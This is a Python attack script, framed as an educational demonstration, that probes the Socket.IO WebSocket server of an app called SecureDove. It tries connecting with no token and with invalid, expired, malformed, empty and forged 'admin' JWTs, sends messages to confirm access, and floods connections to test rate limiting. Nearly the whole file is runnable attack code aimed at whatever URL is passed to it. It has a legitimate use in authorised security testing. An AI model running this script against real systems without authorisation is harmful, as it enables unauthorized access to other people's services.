#!/usr/bin/env python3
"""
WebSocket Authentication Bypass Attack Script for SecureDove
Educational demonstration of WebSocket authentication bypass vulnerability

This script demonstrates how an attacker could bypass WebSocket authentication
by exploiting improper token validation or missing authentication checks.
"""

import asyncio
import socketio
import json
import sys
import time
from typing import Optional, Dict, Any

class WebSocketAttacker:
    def __init__(self, ws_url: str = "http://localhost:8000"):
        self.ws_url = ws_url
        self.sio = None
        self.connected = False

    async def connect_websocket(self, token: Optional[str] = None) -> bool:
        """
        Attempt to connect to WebSocket with optional authentication token

        Args:
            token: JWT token for authentication (optional)

        Returns:
            True if connection successful, False otherwise
        """
        try:
            # Create new socketio client for each attempt
            self.sio = socketio.AsyncClient()
            
            # Set up event handlers
            @self.sio.event
            async def connect():
                self.connected = True
                print("    âœ… Connected to Socket.IO server")
            
            @self.sio.event
            async def disconnect():
                self.connected = False
                print("    âŒ Disconnected from Socket.IO server")
            
            @self.sio.event
            async def authenticated(data):
                print(f"    ðŸ“¨ Authentication response: {data}")
            
            # Connect to server
            await self.sio.connect(self.ws_url)
            
            # Wait a bit for connection to establish
            await asyncio.sleep(1)
            
            # Send authentication if token provided
            if token:
                await self.sio.emit('authenticate', token)
                # Wait for authentication response
                await asyncio.sleep(1)
            
            return self.connected
            
        except Exception as e:
            print(f"    âŒ Connection failed: {str(e)}")
            self.connected = False
            return False

    async def test_message_sending(self) -> bool:
        """
        Test if we can send messages through the WebSocket

        Returns:
            True if message sending works, False otherwise
        """
        if not self.sio or not self.connected:
            return False

        try:
            test_message = {
                "type": "test",
                "content": "Hello from attacker",
                "timestamp": int(time.time() * 1000)
            }

            await self.sio.emit('test_message', test_message)
            print("    âœ… Message sent successfully")

            # Wait for potential response
            await asyncio.sleep(2)
            
            return True

        except Exception as e:
            print(f"    âŒ Message sending failed: {str(e)}")
            return False

    async def test_bypass_attempts(self) -> Dict[str, bool]:
        """
        Test various WebSocket authentication bypass techniques

        Returns:
            Dictionary mapping attack names to success status
        """
        attacks = {
            "no_auth": "Connect without any authentication",
            "invalid_token": "Connect with invalid JWT token",
            "expired_token": "Connect with expired JWT token",
            "malformed_token": "Connect with malformed JWT token",
            "empty_token": "Connect with empty token",
            "tampered_token": "Connect with tampered JWT token"
        }

        results = {}

        for attack_name, description in attacks.items():
            print(f"\n[+] Testing: {description}")

            # Close existing connection
            if self.sio:
                await self.sio.disconnect()
                self.sio = None
                self.connected = False

            # Prepare token based on attack type
            token = None
            if attack_name == "invalid_token":
                token = "invalid.jwt.token.here"
            elif attack_name == "expired_token":
                # Create an expired token (header.payload.signature)
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6MTYwMDAwMDAwMH0.invalid_signature"
            elif attack_name == "malformed_token":
                token = "not-a-jwt-token-at-all"
            elif attack_name == "empty_token":
                token = ""
            elif attack_name == "tampered_token":
                # Tampered token with modified payload
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.tampered_signature"

            # Attempt connection
            connected = await self.connect_websocket(token)

            if connected:
                # Test if we can actually send messages
                can_send = await self.test_message_sending()
                results[attack_name] = can_send
                if can_send:
                    print(f"    ðŸš¨ VULNERABILITY: {attack_name} bypass successful!")
            else:
                results[attack_name] = False

        return results

    async def test_rate_limiting_bypass(self) -> bool:
        """
        Test if WebSocket connections can bypass rate limiting

        Returns:
            True if rate limiting can be bypassed, False otherwise
        """
        print("\n[+] Testing WebSocket rate limiting bypass")

        connections = []
        success_count = 0

        # Try to create multiple connections rapidly
        for i in range(10):
            try:
                sio = socketio.AsyncClient()
                
                @sio.event
                async def connect():
                    pass
                
                await sio.connect(self.ws_url, wait_timeout=2)
                connections.append(sio)
                success_count += 1
                print(f"    âœ… Connection {i+1} established")
            except Exception as e:
                print(f"    âŒ Connection {i+1} failed: {str(e)}")
                break

        # Clean up connections
        for sio in connections:
            try:
                await sio.disconnect()
            except:
                pass

        if success_count >= 5:  # Arbitrary threshold
            print(f"    ðŸš¨ VULNERABILITY: Created {success_count} concurrent connections")
            print("    Rate limiting may not be properly implemented")
            return True
        else:
            print(f"    âœ… Rate limiting appears effective ({success_count} connections)")
            return False

    async def demonstrate_vulnerability(self):
        """Main demonstration of WebSocket authentication bypass"""
        print("=" * 60)
        print("WEBSOCKET AUTHENTICATION BYPASS DEMONSTRATION")
        print("=" * 60)
        print("This script demonstrates WebSocket authentication bypass")
        print("vulnerabilities in the SecureDove application.\n")

        print(f"[*] Targeting WebSocket server: {self.ws_url}")

        # Test authentication bypass attempts
        auth_results = await self.test_bypass_attempts()

        # Test rate limiting
        rate_limit_bypass = await self.test_rate_limiting_bypass()

        # Clean up
        if self.sio:
            await self.sio.disconnect()

        # Summary
        successful_bypasses = [k for k, v in auth_results.items() if v]

        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)
        print(f"Authentication bypass attempts: {len(auth_results)}")
        print(f"Successful bypasses: {len(successful_bypasses)}")

        if successful_bypasses:
            print("\n[+] WEBSOCKET VULNERABILITIES CONFIRMED!")
            print("The following authentication bypass methods worked:")
            for method in successful_bypasses:
                print(f"  - {method.replace('_', ' ').title()}")
        else:
            print("\n[-] No WebSocket authentication bypass vulnerabilities detected")

        if rate_limit_bypass:
            print("\n[+] RATE LIMITING VULNERABILITY CONFIRMED!")
            print("WebSocket connections can bypass rate limiting")
        else:
            print("\n[-] Rate limiting appears properly implemented")

        print("\n[*] Note: WebSocket authentication should validate tokens on connection")
        print("[*] Implement proper token validation and rate limiting")
        print("[*] Consider using secure WebSocket libraries with built-in auth")

async def main():
    if len(sys.argv) > 1:
        ws_url = sys.argv[1]
    else:
        ws_url = "http://localhost:8000"

    print(f"[*] Targeting WebSocket server: {ws_url}")

    attacker = WebSocketAttacker(ws_url)
    await attacker.demonstrate_vulnerability()

if __name__ == "__main__":
    asyncio.run(main())